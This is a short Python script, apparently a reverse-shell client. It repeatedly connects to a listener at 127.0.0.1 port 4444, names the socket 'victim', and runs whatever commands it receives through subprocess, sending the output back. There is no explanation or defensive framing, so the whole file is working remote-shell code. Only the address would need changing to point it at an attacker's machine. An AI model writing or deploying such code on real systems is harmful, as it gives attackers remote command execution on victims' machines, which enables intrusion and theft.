import socket
import subprocess
import os
import time

while True:
    victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Try to connect...')

    try:
        victim.connect(('127.0.0.1', 4444))
        print('Connected!')

        while True:
            command = victim.recv(4096).decode().strip()

            if not command or command.lower() == 'exit':
                break

            if command[:2] == 'cd':
                try:
                    os.chdir(command[2:].strip())
                    output = ' '
                except FileNotFoundError as err:
                    victim.send(str(err).encode('cp866'))
                    continue

            else:
                output = subprocess.getoutput(command, encoding='cp866')

            victim.send(output.encode('cp866'))

        victim.close()
        time.sleep(1)

    except ConnectionError as e:
        print(e)
        continue
